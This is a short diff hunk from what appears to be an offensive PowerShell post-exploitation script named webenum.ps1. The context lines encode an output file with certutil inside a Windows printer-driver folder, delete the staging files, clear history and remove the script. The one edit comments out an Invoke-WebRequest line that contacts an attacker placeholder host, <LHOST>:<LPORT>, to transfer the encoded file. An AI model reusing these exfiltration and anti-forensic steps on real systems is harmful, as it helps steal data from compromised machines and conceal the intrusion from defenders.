@@ -81,7 +81,7 @@ certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 2.txt
 rm 1.txt
 rm 2.txt
 #send output file
-Invoke-WebRequest "http://<LHOST>:<LPORT>/2.txt" -OutFile "2.txt"	                                                                                     #Change L IP / PORT
+#Invoke-WebRequest "http://<LHOST>:<LPORT>/2.txt" -OutFile "2.txt"	                                                                                     #Change L IP / PORT
 # remove bash history
 clear
 rm webenum.ps1
